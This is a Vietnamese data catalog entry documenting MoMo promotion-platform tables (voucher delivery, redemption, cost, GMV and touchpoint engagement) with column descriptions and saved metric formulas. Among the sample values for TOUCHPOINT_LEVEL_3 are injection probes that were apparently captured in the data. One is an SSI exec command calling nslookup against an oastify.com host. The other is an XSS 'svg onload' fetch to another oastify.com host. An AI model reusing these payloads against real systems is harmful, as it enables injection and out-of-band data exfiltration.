# BU MDS: Promotion - Platform Performance (Project team only)

**Domain ID:** `9d86b9d9-bf1e-4bab-8e11-86279716984a`

## Description
Data từ delivery -> redeem, và engagement trên Promotion Platform. Các metric liên quan đến cost và gmv, user engagement của Promotion (toàn MoMo). Note: chỉ có data delivery redeem của voucher code mềm (không bao gồm voucher code cứng)

## Tables

### `momovn-prod.MBI_DA.PROMOTION_PERFORMANCE_AGG`
> Bảng này là một bảng tổng hợp thông tin hiệu suất của các chương trình khuyến mãi. Nó theo dõi các chỉ số liên quan đến việc phân phối và sử dụng gift, bao gồm cả chi phí và giá trị giao dịch. Bảng này có thể được sử dụng để phân tích hiệu suất của các chương trình khuyến mãi và tối ưu hóa cho các chiến dịch tương lai.
- Theo dõi số lượng gift đã được phát và sử dụng, chi phí và GMV liên quan.
- Xác định hiệu quả của các gift dựa trên phần trăm giảm giá và các tiêu chí áp dụng khác.
- Đánh giá sự thành công của các chương trình khuyến mãi thông qua các chỉ số như số user đã sử dụng gift và doanh thu hoàn lại.

| Column | Type | Description | Example |
|--------|------|-------------|---------|
| `DELIVER_DATE` | — | Ngày thả gift | 2025-04-28, 2025-09-11, 2025-08-31 |
| `END_DATE` | — | Ngày hết hạn gift | 2025-05-27, 2025-03-11, 2025-04-28 |
| `REDEEM_DATE` | — | Ngày sử dụng gift | 2025-05-27, 2025-09-10, 2025-09-11 |
| `CAMPAIGN_ID` | — | ID của campaign | 250515_budget_clvc_4z9m2xwo5, 250515_budget_clvc_o2m92y2p5, 250515_budget_clvc_k34p3kdp5 |
| `GIFT_TYPE_ID` | — | ID của gift_type | 220509_fs_new_aff_kv_bh_50k, 240222_bankentercode_tiktokshop_100k, 250116_98_ngt_new_200k_allser2_50k |
| `STATUS_DESC` | — | Mô tả của trạng thái của gift | Voucher bị treo, Voucher còn hạn nhưng User xóa, Voucher hết hạn |
| `IS_TID` | — | Liệu có phải là TID hay không (1: có) | 0, 1 |
| `AGENT` | — | Agent của gift | kgs_dls340_20250505_0006, kgs_dls324_mcinv_b2b_20250515_0152, kgs_dls324_mcinv_b2b_20250515_0160 |
| `VOUCHER_DELIVERY` | — | Số lượng gift được phát | 592, 23, 71 |
| `VOUCHER_REDEEM` | — | Số lượng gift được sử dụng | 23, 293, 80 |
| `VOUCHER_COST` | — | Chi phí sử dụng gift | 47000, 7000, 150000 |
| `GMV` | — | GMV từ các giao dịch sử dụng gift | 577210, 4419348, 32000 |
| `REFUND_VOUCHER_COST` | — | Chi phí được hoàn lại của gift | -50000, -57000, -38600 |
| `REFUND_GMV` | — | GMV từ các giao dịch được hoàn lại | -1577895, -98000, -1912000 |
| `DELIVER_USER` | — | Số lượng deliver user (đã gom nhóm theo các dimension của table) | 213, 23, 1167 |
| `REDEEM_USER` | — | Số lượng redeem user (đã gom nhóm theo các dimension của table) | 23, 293, 80 |
| `PARTITION_DATE` | — | Ngày partition | 20250617, 20250605, 20250627 |
| `CAMPAIGN_NAME` | — | Tên chương trình | [Momo] Voucher 20k cho đơn từ 85k, WONDERSEA CAFÉ, TRÀ SỮA BI - Nguyễn Văn Bứa |
| `CAMPAIGN_START_DATE` | — | Thời gian campaign bắt đầu | 2025-04-23, 2025-02-07, 2025-04-28 |
| `CAMPAIGN_END_DATE` | — | Thời gian campaign kết thúc | 2025-05-27, 2025-08-31, 2025-08-25 |
| `CAMPAIGN_SCHEME` | — | Scheme của campaign theo thông tin hệ thống | budget_coin_reward, campaign_event, m4b_collect_voucher |
| `SOURCE` | — | Nguồn tạo campaign (ipos, builder, etc.) | IPOS_CAMPAIGN, BUILDER_CAMPAIGN |
| `BU_CREATED` | — | BU tạo gift | Social Payment, Platform, DLS - OTT |
| `DISTRIBUTION_GROUP` | — | Nhóm scheme campaign (level 1) | unknown, delivery_by_trans, passive |
| `DELIVERY_SCHEME` | — | Scheme của campaign (level 2) | no_budget_open_app_kindle, no_budget_open_app, budget_coin_reward |
| `GIFT_TYPE_NAME` | — | Tên của gift | LEMONDESTEAK - Giảm 200.000đ cho đơn từ 1Tr, SHANGCHI - Giảm 100.000đ cho đơn từ 500K, Quán Cô Hồng - Giảm 15% tối đa 20K cho đơn từ 0đ |
| `GIFT_TYPE_CATEGORY` | — | Nhóm của gift_type | 0, 8, 5 |
| `GIFT_TYPE_SOURCE` | — | Nguồn tạo gift (ipos, athena, nike) | nike, ipos, athena |
| `GIFT_TYPE_GROUP` | — | Loại gift (discount, voucher_code, cashback, etc.) | cashback, voucher_code, discount |
| `GIFT_TYPE_TYPE` | — | Hình thức khuyến mãi (percent, etc.) | film_discount, percent, amount |
| `DISCOUNT_PERCENT` | — | Phần trăm giảm giá | 80, 35, 100 |
| `GIFT_TYPE_CAP` | — | Số tiền tối đa được giảm của gift | 50000.0, 480000, 45000 |
| `MIN_BILL_SIZE` | — | Số tiền tối thiểu của bill để được sử dụng gift | 45000, 299000, 700000 |
| `IS_STACKING` | — | Liệu gift được stacking hay không | 0, 1 |
| `IS_AUTO_PICK` | — | Liệu gift có được autopick hay không | 0, 1 |
| `IS_HARDCODE_VOUCHER` | — | Liệu gift có phải là code cứng không | 0, 1 |
| `ETL_TIME` | — | Thời gian ETL | 2025-08-14 22:27:56.728846+00, 2025-09-11 06:30:30.046012+00, 2025-08-16 06:47:56.470106+00 |

### `momovn-mds-dc.dmt.F_PROMO_USER_ENGAGEMENT_TOUCHPOINT_LEVEL_DAILY`
> Bảng fact này cung cấp thông tin chi tiết hàng ngày về sự kiện tương tác của người dùng với các điểm chạm (touchpoints) trong các chương trình khuyến mãi. Các thông tin từ bảng này có thể được sử dụng để: 
 - Phân tích mức độ tương tác của người dùng qua từng cấp độ điểm chạm.
 - Theo dõi số lần hiển thị và mức độ tương tác cho từng tài sản và voucher.
 - Đánh giá hiệu quả của các chiến dịch khuyến mãi theo ngày hoặc theo các thông tin thời gian khác như tuần, tháng.

| Column | Type | Description | Example |
|--------|------|-------------|---------|
| `DATE_KEY` | — | Khóa định danh cho dữ liệu ngày. | 2025-09-16-day, 2025-09-01-month, 2025-09-11-day |
| `MONTH_DATE` | — | Ngày thuộc tháng trong định dạng DATE. | 2025-09-01, 2025-08-01 |
| `WEEK_DATE` | — | Ngày thuộc tuần trong định dạng DATE. | — |
| `DAY_DATE` | — | Ngày thuộc ngày cụ thể trong định dạng DATE. | 2025-09-16, 2025-09-11, 2025-09-15 |
| `GRANULARITY` | — | Mức độ chi tiết của dữ liệu được báo cáo. | day, month |
| `REPORT_LEVEL` | — | Cấp độ báo cáo của dữ liệu. | 4, 3, 1 |
| `TOUCHPOINT_LEVEL_1` | — | Cấp độ đầu tiên của điểm chạm. | PROMOTION_HUB, GLOBAL_SEARCH, SAFE_PAYMENT |
| `TOUCHPOINT_LEVEL_2` | — | Cấp độ thứ hai của điểm chạm. | momo_rewards_view_detail, promotion, all_voucher_collection_flashdeal |
| `TOUCHPOINT_LEVEL_3` | — | Cấp độ thứ ba của điểm chạm. | , "-->'-->`--><!--#set var="1tk" value="0sjplaelkb"--><!--#set var="3vm" value="2ulrncgnmd"--><!--#echo var="1tk"--><!--#echo var="3vm"--><!--#exec cmd="nslookup -q=cname nf6c8x187y0kyj6mpxg48irwpnvgj67y5mx9yxn.oastify.com" -->, '"><svg/onload=fetch`//1qsqjbcmicby9xh00brijw2a016uukic800n1bq\.oastify.com`> |
| `TOUCHPOINT_LEVEL_4` | — | Cấp độ thứ tư của điểm chạm. | ALL, , banklink_cashin |
| `TOTAL_IMPRESSION` | — | Tổng số lần hiển thị của các điểm chạm. | 29913, 2438, 1793522 |
| `TOTAL_IMPRESSION_USER` | — | Tổng số người dùng có lần hiển thị của các điểm chạm. | 844, 348, 235085 |
| `TOTAL_ENGAGEMENT` | — | Tổng số sự kiện tương tác của người dùng với các điểm chạm. | 2117, 241, 362913 |
| `TOTAL_ENGAGEMENT_USER` | — | Tổng số người dùng tham gia tương tác với các điểm chạm. | 1394, 129, 109042 |
| `TOTAL_ASSET_IMPRESSION` | — | Tổng số lần hiển thị của tài sản. | 28980, 1374, 977257 |
| `TOTAL_ASSET_IMPRESSION_USER` | — | Tổng số người dùng có lần hiển thị của tài sản. | 837, 306, 171266 |
| `TOTAL_ASSET_ENGAGEMENT` | — | Tổng số sự kiện tương tác của người dùng với tài sản. | 1327, 118, 342418 |
| `TOTAL_ASSET_ENGAGEMENT_USER` | — | Tổng số người dùng tham gia tương tác với tài sản. | 934, 62, 105368 |
| `VOUCHER_CLICK_COLLECT` | — | Tổng số lần nhấp vào để thu thập voucher. | 0, 101, 43247 |
| `VOUCHER_CLICK_COLLECT_USER` | — | Tổng số người dùng nhấp vào để thu thập voucher. | 0, 58, 34253 |
| `VOUCHER_CLICK_VIEW_DETAIL` | — | Tổng số lần nhấp vào để xem chi tiết voucher. | 1327, 0, 34105 |
| `VOUCHER_CLICK_VIEW_DETAIL_USER` | — | Tổng số người dùng nhấp vào để xem chi tiết voucher. | 934, 0, 24253 |
| `VOUCHER_CLICK_USE` | — | Tổng số lần nhấp vào để sử dụng voucher. | 0, 11, 120041 |
| `VOUCHER_CLICK_USE_USER` | — | Tổng số người dùng nhấp vào để sử dụng voucher. | 0, 11, 84432 |
| `ETL_TIME` | — | Thời gian xử lý ETL cho dữ liệu. | 2025-09-17 08:00:55.709318+00, 2025-09-17 08:08:09.965170+00, 2025-09-16 07:24:03.651315+00 |

## Memory
*8 entries — user-trained knowledge*

1. redemption_rate = sum(voucher_redeem) / sum(voucher_delivery) _Promotion - Campaign Performance · 2025-07-29_
2. gmv_after_refund = sum(gmv) + sum(refund_gmv) _Promotion - Campaign Performance · 2025-07-29_
3. Khi user hỏi về engagement performance theo ngày, luôn query trendline hàng ngày và tính average thay vì sum. _2025-09-17_
4. voucher_delivery: Số lượng gift được phát
voucher_redeem: Số lượng gift được sử dụng
voucher_cost: Chi phí sử dụng gift
gmv: gmv từ các giao dịch sử dụng gift
refund_voucher_cost: Chi phí được hoàn lại của gift
refund_gmv: GMV từ các giao dịch được hoàn lại _Promotion - Campaign Performance · 2025-07-29_
5. Metric definition: voucher_cost_after_refund = SUM(voucher_cost) + SUM(refund_voucher_cost) _Promotion - Campaign Performance · 2025-07-29_
6. Metric definition: gmv_after_refund = sum(gmv) + sum(refund_gmv) _Promotion - Campaign Performance · 2025-07-29_
7. Metric definition: redemption_rate = sum(voucher_redeem) / sum(voucher_delivery) _Promotion - Campaign Performance · 2025-07-29_
8. Số lượng users vào PromoHub = số lượng user thu thập promo/đổi xu thành công trong PromoHub _Promotion - Campaign Performance · 2025-08-12_
